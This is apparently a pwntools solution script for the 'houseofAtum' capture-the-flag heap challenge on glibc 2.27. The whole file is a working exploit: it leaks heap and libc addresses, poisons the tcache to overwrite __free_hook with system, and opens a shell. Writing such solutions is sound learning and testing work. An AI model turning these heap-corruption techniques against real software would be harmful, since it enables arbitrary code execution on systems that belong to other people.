from pwn import *
import sys

context.arch = "amd64"
elf = ELF("./houseofAtum")
status = sys.argv[1]

if status == 'l':
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    io = process("./houseofAtum")
elif status == 'd':
    libc = ELF("./libc.so.6")
    io = process("./houseofAtum",env = {"LD_PRELOAD":"./libc.so.6"})
else:
    info("INVALID STATUS")
    exit()

def choice(idx):
    io.sendlineafter("choice:",str(idx))
def addN(data):
    choice(1)
    io.sendafter("content:",data)
def editN(idx,data):
    choice(2)
    io.sendlineafter("idx:",str(idx))
    io.sendafter("content:",data)
def freeN(idx,c):
    choice(3)
    io.sendlineafter("idx:",str(idx))
    io.sendlineafter("(y/n):",c)
def showN(idx):
    choice(4)
    io.sendlineafter("idx:",str(idx))

addN("aaaa")
addN("bbbb")
freeN(1,'n')
freeN(0,'n')
showN(0)
io.recvuntil('Content:')
heap_base = u64(io.recv(6).ljust(8,'\x00'))&0xfffffffff000
success("HEAP BASE -> %#x"%heap_base)

for i in range(5):
    freeN(0,'n')
info("7 TCACHE FILLED")

freeN(1,'y')
freeN(0,'y')
# 0x250 & 0x2b0 fastbin
fake_fd = '\x00'*0x30
fake_fd += p64(0x0)+p64(0xa1)
fake_fd += p64(heap_base+0x30)
addN(fake_fd)
info("Misalign fd by fast bins")
addN('\x30')
#0:0x260 1:0x2a0
freeN(1,'y')
addN("dddd")#1:0x030
info("Allocate a chunk(hp+0x30) near entry")
freeN(0,'y')#0x260
editN(1,p64(0)*7+p64(heap_base+0x10))
addN(p64(0)*3+p64(0x2d1)+'\x00'*3+'\x07')
info("Falsify tcache_perthread_struct.counts to get an unsorted bin(hp+0x10)")
freeN(0,'n')
showN(0)
io.recvuntil('Content:')
libc_base = u64(io.recv(6).ljust(8,'\x00'))-96-(libc.sym['__malloc_hook']+0x10)
success("LIBC BASE -> %#x"%libc_base)

fake_entry = p64(libc_base+libc.sym['__free_hook']-8)
editN(1,p64(0)*7+p64(heap_base+0x10))
freeN(0,'y')
editN(1,p64(0)*7+fake_entry)
addN("/bin/sh\x00"+p64(libc_base+libc.sym['system']))
io.interactive()
freeN(1,'y')
io.interactive()
